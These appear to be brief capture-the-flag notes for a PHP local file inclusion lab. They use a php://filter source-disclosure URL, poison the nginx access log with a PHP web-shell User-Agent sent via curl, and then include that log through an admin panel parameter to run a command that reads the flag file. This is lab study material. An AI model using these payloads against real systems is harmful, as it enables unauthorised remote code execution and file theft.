```url
http://<SERVER_IP>:<PORT>/index.php?page=php://filter/read=convert.base64-encode/resource=index
```
- Found the admin panel at /ilf_admin

```
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
http://<SERVER_IP>:<PORT>/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat%20%2Fflag%5Fdacc60f2348d%2Etxt
```
- Found flag
